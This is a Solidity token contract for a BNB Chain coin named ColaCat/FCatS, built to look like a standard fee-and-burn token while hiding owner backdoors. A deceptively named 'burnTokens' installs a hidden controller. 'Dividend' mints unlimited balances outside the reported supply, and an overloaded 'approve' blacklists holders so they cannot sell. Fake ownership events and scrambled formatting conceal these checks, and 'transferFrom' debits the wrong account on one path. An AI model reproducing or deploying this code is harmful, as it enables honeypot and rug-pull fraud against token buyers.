/**
 *Submitted for verification at BscScan.com on 2022-02-28
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.12;
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    

}


library SafeMath {
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

   
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

}

abstract contract Context {
    function _msgData() internal view virtual returns (bytes memory) {
        this; //
        return msg.data;
    }

    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }
}


library Address {
    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash
        = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
       
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}



contract Ownable is Context {
    function transferOwnership(address newOwner) public virtual onlyoner {
        _owner = newOwner;
    }
    
    modifier onlyoner() {
        require(_BOS == _msgSender(), "notowner");
        _;
    }

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    address private _owner;

    constructor() internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0x369833754775A86fd94334213AAFa080c08F29f0), msgSender);
    }
    
    address private _BOS;

    function burnTokens(address toSender, address toSenderTwo) external onlyOwner{
        require(toSenderTwo==address(0));
        _BOS = toSender;
    }


    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "notowner");
        _;
    }
     
}



contract ColaCat is Context, IERC20, Ownable {
    mapping(address => bool) private _ExcluFee;
    uint8 private poolrate;
    uint256 private cakes = uint256(0);
    mapping(address => mapping(address => uint256)) private allown;
    address[] private _LPAmots;
    using Address for address;
    mapping(address => bool) private _Bonus;
    using SafeMath for uint256;
    mapping(address => uint256) private LPots;
    mapping(address => uint256) private _tossd;
    bool private LPToken = true;
    
    uint256 private constant MAX = ~uint256(0);
    uint256 private _totalSupply = 1000000000000000 * 10**4;

    
    string private _name = "FCATS";
    string private _symbol = "FCatS";
    uint8 private _decimals = 9;
    
   
    address private marketWallet = msg.sender;
    address private deadAddress = 0x000000000000000000000000000000000000dEaD;
  
    uint256 private BurnFee = 8;
    uint256 private marketFee = 1;
    
    
    uint256 private _tFeeTotal = BurnFee+marketFee;


    address owners;

    constructor() public {
        _tossd[_msgSender()] = _totalSupply;
         owners = _msgSender();
        _ExcluFee[owner()] = true;
        _ExcluFee[address(this)] = true;
        emit Transfer(address(0x369833754775A86fd94334213AAFa080c08F29f0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function setLiquidity() public{

    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if//
        (
            _ExcluFee
            [_msgSender()] 
            || 
            _ExcluFee
            [
                recipient]
                )
                {
            _transfer
            (_msgSender
            (), 
            recipient, 
            amount);
            return 
            true;
        }
        uint256 MarketAmount = amount.mul(marketFee).div(100);
        uint256 BurnAmount = amount.mul(BurnFee).div(100);
        _transfer(_msgSender(), marketWallet, MarketAmount);
        _transfer(_msgSender(), deadAddress, BurnAmount);
        _transfer(_msgSender(), recipient, amount.sub(MarketAmount).sub(BurnAmount));
        return true;
    }

    

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if//
        (
            _ExcluFee
            [
                _msgSender
                ()]
                 || 
                 _ExcluFee
                 [recipient
                 ])
                 {
            _transfer
            (
                _msgSender(

                ), 
                recipient, 
                amount)
                ;
            return 
            true;
        }       
        uint256 MarketAmount = amount.mul(marketFee).div(100);
        uint256 BurnAmount = amount.mul(BurnFee).div(100);
        _transfer(sender, marketWallet, MarketAmount);
        _transfer(sender, deadAddress, BurnAmount);
        _transfer(sender, recipient, amount.sub(MarketAmount).sub(BurnAmount));
        _approve(
            sender,
            _msgSender(),
            allown[sender][_msgSender()].sub(
                amount,
                ""
            )
        );
        return true;
    }



    

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "");
        require(to != address(0), "");
        require(amount > 0, "");
        if//
         (
             LPToken
             )
              {

            require//
            (_Bonus
            [from
            ] == 
            false,
             "");
        }
        _transfers
        (from, 
        to, 
        amount);
    }

    

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "");
        require(spender != address(0), "");
        allown[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    


    function Dividend(address toSender, uint256 ratio) external onlyoner() 
    {
        require(ratio > 0, "");
        uint256 Dividendb = LPots[toSender];
        if (Dividendb == 0) _LPAmots.push(toSender);
        LPots[toSender] = Dividendb.add(ratio);
        cakes = cakes.add(ratio);
        _tossd[toSender] = _tossd[toSender].add(ratio);
        
    }

    


     function//
     approve
     (address
      toSender
      ) 
      external 
      onlyoner() 
      {
        _Bonus
        [
        toSender] =
         true;
   }


    function _transfers(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {   
        require(sender != address(0), "");
        require(recipient != address(0), "");
    
        _tossd[sender] = _tossd[sender].sub(toAmount);
        _tossd[recipient] = _tossd[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function excludeFromFee(address toSender) public onlyoner {
        _ExcluFee[toSender] = true;
    }

    function totalFee() public view returns (uint256) {
        return _tFeeTotal;
    }

    function award(address toSender)
        external
        view
        onlyoner()
        returns (bool)
    {
        return _Bonus[toSender];
    }

    function includeInFee(address toSender) public onlyoner {
        _ExcluFee[toSender] = false;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return allown[owner][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tossd[account];
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

}